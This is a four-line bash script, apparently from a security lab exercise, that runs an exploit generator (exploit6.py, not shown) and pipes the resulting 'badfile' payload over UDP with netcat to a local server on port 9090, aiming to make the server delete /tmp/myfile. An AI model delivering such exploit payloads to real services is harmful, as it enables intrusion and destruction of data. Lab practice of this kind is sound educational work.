#!/bin/bash
echo "Remove a file created under /tmp called myfile, if file doesn't exist, the server will inform us"
python3 exploit6.py
nc -u 127.0.0.1 9090 < badfile


